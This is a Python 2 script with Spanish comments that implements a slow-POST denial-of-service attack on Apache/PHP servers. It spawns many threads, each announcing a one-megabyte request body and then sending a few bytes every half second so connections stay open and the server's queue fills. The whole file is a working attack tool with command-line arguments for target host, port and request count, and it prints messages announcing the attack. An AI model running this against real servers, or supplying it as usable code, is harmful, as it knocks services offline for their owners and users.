# coding=utf-8
#Este código recibe 4 parámetros: [1] el host sin http, [2] el puerto, [3] la cantidad de peticiones y [4] información
#Los primeros 3 parámetros son indispensables, el 4 es opcional
"""
FUNCIONALIDAD:
Ataque para servidores PHP. Se basa en la idea de que estos servidores de apache resuelven petición por petición
y como forma de mitigar la posible pérdida de peticiones mientras atienden otras, los encola. El ataque por tanto
trata de sobrecargar esa cola dejando las peticiones abiertas.
"""

import socket, sys, os
from optparse import OptionParser
from time import sleep
import socket
import threading

def ataque(url, puerto, numPeticiones, recurso):
    pool = []
    #el sleep time para este ataque será
    sleepTime = 500	
    try:
        for i in range(1, int(numPeticiones)):
            t = Worker(url, puerto, recurso, sleepTime)
            pool.append(t)
            t.start()
        print "Iniciando las peticiones. Presiona Ctrl+C para detener el script"
        while True: sleep(1)
    except KeyboardInterrupt, e:
        print "Se detuvo el ataque"
        for worker in pool: worker.stop()
        for worker in pool: worker.join()

class Worker(threading.Thread):
    def __init__(self, host, port, path, sleepTime):
        self.host = host
        self.port = port
        self.path = path
        self.sleepTime = sleepTime
        self.stopped = False
        threading.Thread.__init__(self)
    
    def stop(self):
        self.stopped = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, int(self.port)))
        s.settimeout(1)
        s.send(
            'POST ' + self.path + ' HTTP/1.1\r\n' +
            'Host: ' + self.host + '\r\n' +
            'Connection: close\r\n' +
            'Content-Length: 1000000\r\n' +
            '\r\n'
        )
        while not self.stopped:
            s.send('abc=123&')
            sleep(self.sleepTime/1000)
        s.close


def main():
    if len(sys.argv) < 3:
        print "Este script requiere 4 parámetros"
    else:
        url = sys.argv[1]
        puerto = sys.argv[2]
        numPeticiones = sys.argv[3]
        recurso = sys.argv[4]

        print ">>>>> Atacando al host " + url
        print "Puerto " + puerto
        print "Recurso " + recurso + "\n"
        #Llama al método
        ataque(url, puerto, numPeticiones, recurso)
        
if __name__ == '__main__': main()
